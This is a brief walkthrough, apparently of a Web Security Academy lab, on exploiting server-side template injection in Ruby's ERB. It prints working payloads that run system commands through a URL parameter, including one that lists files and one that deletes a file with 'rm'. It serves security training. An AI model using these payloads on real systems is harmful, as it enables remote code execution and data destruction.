## Basic server-side template injection

If you click in the first product, a message will appear in the uri

```
https://random_.web-security-academy.net/?message=Unfortunately this product is out of stock
```

The template engine used is [ERB](https://www.stuartellis.name/articles/erb/) (as told in lab description). First payload tried

```<%=Time.now.strftime('%A')>```

It will return the current day, after that you can make RCE inside the server.

```<%=system("ls")%>```

It will return 

```morale.txt true```

Removig morale.txt as told to us

```https://random_.web-security-academy.net/?message=<%=system("rm morale.txt")```


Just that simple :)


